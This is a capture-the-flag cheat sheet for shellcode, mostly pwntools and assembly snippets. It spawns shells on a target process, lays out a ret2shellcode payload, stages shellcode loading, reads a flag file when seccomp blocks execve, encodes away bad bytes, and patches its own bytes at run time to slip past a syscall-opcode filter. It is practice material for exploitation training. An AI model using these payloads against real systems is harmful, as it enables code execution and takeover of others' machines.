# Shellcode

## Pwntools

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

sc = asm(shellcraft.sh())
print(len(sc), sc.hex())
```

```python
# send raw shellcode
io.sendline(sc)
io.interactive()
```

## Common Shellcraft

```python
asm(shellcraft.sh())
asm(shellcraft.execve("/bin/sh", 0, 0))
asm(shellcraft.cat("/flag.txt"))
asm(shellcraft.open("/flag.txt") + shellcraft.read("rax", "rsp", 0x100) + shellcraft.write(1, "rsp", 0x100))
```

## Runner

```python
from pwn import *

context.arch = "amd64"
sc = asm(shellcraft.sh())

p = process("./chall")
p.sendline(sc)
p.interactive()
```

## Ret2shellcode

```python
context.arch = "amd64"

sc = asm(shellcraft.sh())
payload = flat({
    offset: [
        b"\x90" * 32,
        sc,
        b"A" * (200 - 32 - len(sc)),
        shellcode_addr,
    ]
})
```

## Staged Read

When input length is small, first stage reads bigger shellcode into RWX memory or `mprotect`ed memory.

```python
stage1 = asm(shellcraft.read(0, "rsp", 0x400) + "jmp rsp")
stage2 = asm(shellcraft.sh())

io.send(stage1)
io.send(stage2)
io.interactive()
```

## ORW Shellcode

Use when seccomp blocks `execve` but allows `open/read/write`.

```python
sc = asm(
    shellcraft.open("/flag.txt") +
    shellcraft.read("rax", "rsp", 0x100) +
    shellcraft.write(1, "rsp", 0x100)
)
```

## i386

```python
context.arch = "i386"
sc = asm(shellcraft.sh())
```

```asm
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
```

## Bad Bytes

```python
bad = b"\x00\x0a\x0d\x20"
assert not any(c in sc for c in bad)
```

```python
enc = encoders.encode(sc, avoid=b"\x00\x0a")
print(enc.hex())
```

## Debug

```bash
seccomp-tools dump ./chall
strace -f ./chall
```

```gdb
x/40i $rip
x/80bx $rsp
```

### Bypass \`syscall\` hex blacklist

```asm
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    dec byte ptr [rip + syscall]
    dec byte ptr [rip + syscall + 1]

syscall:
    .byte 0x10, 0x06
```

```asm
    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]

syscall:
    .byte 0x0e, 0x04
```
